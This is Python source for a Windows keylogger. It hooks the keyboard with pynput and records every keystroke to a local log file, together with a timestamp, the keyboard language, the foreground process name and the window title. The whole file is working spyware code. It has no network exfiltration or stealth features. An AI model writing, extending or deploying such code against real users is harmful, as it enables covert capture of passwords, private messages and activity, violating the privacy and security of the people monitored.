from pynput.keyboard import Key, Listener
import logging
import ctypes
import win32process
import win32gui
import psutil

from helpers import load_data

class Keylogger:
  def __init__(self, filename: str = "keystrokes"):
    logging.basicConfig(
      filename=f"{filename}.log", format="%(asctime)s - %(message)s",
      datefmt="%d/%m/%y - %H:%M:%S", level=logging.INFO, encoding="utf-8")
    self.initial_keyboard_language = self.get_keyboard_language()
    self.shift_on = False
    self.log = ""

  def start(self):
    listener = Listener(
            on_press=self.process_keypress,
            on_release=self.process_keyrelease)
    listener.start()
    listener.join()
  
  def append_to_log(self, curr_key: str):
    logging.info(
      "%s | [%s] - [ %s ]", curr_key,
      self.get_keyboard_language(), self.get_current_window())

  def process_keypress(self, key: Key, curr_key: str = ""):
    try:
      curr_key = key.char
    except AttributeError:
      if key in (Key.shift, Key.shift_r):
        self.shift_on = True
      elif key == Key.enter:
        curr_key = "[ENTER]\n"
      elif key == Key.space:
        curr_key = " "
    
    self.current_keyboard_language = self.get_keyboard_language()
    
    layouts = load_data("languages").get("layouts", {})
    for language in layouts:
      if (language in self.current_keyboard_language and
          language not in self.initial_keyboard_language):
            curr_key = self.keyboard_layout(curr_key)
      
    curr_key = self.is_capslock_on(curr_key)
    if curr_key not in (" ", "", "\n", None):
      self.append_to_log(f"[ { curr_key } ]")
    
    if curr_key != None:
      self.log += curr_key

  def process_keyrelease(self, key: Key):
    if key in (Key.shift, Key.shift_r):
      self.shift_on = False

    if key == Key.delete:
      return False

  def is_capslock_on(self, curr_key: str) -> str:
    capslock_state = bool(ctypes.WinDLL("User32.dll").GetKeyState(0x14))
    return (curr_key.lower() if capslock_state and
            self.shift_on else curr_key.upper()
            if capslock_state else curr_key)

  def get_current_window(self) -> str:
    hwnd = win32gui.GetForegroundWindow()
    pid = win32process.GetWindowThreadProcessId(hwnd)
    return f"{psutil.Process(pid[-1]).name()} | {win32gui.GetWindowText(hwnd)}"

  def get_keyboard_language(self) -> str:
    user32 = ctypes.WinDLL("user32", use_last_error=True)
    curr_window = user32.GetForegroundWindow()
    thread_id = user32.GetWindowThreadProcessId(curr_window, 0)
    klid = user32.GetKeyboardLayout(thread_id)
    lid = klid & (2 ** 16 - 1)
    lid_hex = hex(lid)
    language_id: dict = load_data("languages").get("ID", {})
    try:
      language = language_id.get(str(lid_hex))
    except KeyError:
      language = language_id.get("0x409")
    return language

  def keyboard_layout(self, curr_key) -> str:
    layouts: dict = load_data("languages").get("layouts", {})
    layout = ("".join(layouts.get(self.initial_keyboard_language, "english")),
              "".join(layouts.get(self.current_keyboard_language, "english")))
    layouts_mapping = dict([(ord(a), ord(b)) for (a, b) in zip(*layout)])
    if ord(curr_key) in layouts_mapping:
      curr_key = chr(layouts_mapping[ord(curr_key)])
    return curr_key

  def __call__(self):
    self.start()